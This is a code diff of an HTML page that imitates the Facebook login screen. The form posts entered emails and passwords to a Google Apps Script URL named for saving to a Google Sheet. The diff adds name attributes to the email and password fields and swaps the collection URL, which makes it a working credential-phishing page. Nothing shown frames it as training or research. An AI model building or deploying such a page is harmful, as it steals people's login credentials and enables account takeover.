@@ -15,18 +15,19 @@
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
           <form class="action" name="submit-to-google-sheet">
-            <input type="text" placeholder="Email or Phone Number" required />
-            <input type="password" placeholder="Password" required>
-            <button type="submit" class="submit">Log In</button>
+            <input type="email" name="email" placeholder="Email or Phone Number" required />
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit" class="login">Log In</button>
             <a href="#">Forgot Password ?</a>
             <hr>
             <button class="create-account">Create New Account</button>
+            <span id="success"></span>
           </form>
       </div>
     </div>
 
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwPhpmISj1dJ03g8JZP9tY0ohUdzx-cSwAvoyOOraoYsKAlCnywusNaASoUzUv6Z1n8xQ/exec'
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxkgBSEdWJwMkPhJrcetMRQ1fB-PMIZC2sH7HEHbh8T8YNwNj4B3XAAbzS27acV1XxmJg/exec'
         const form = document.forms['submit-to-google-sheet']
         const success = document.getElementById('success');
         form.addEventListener('submit', e => {
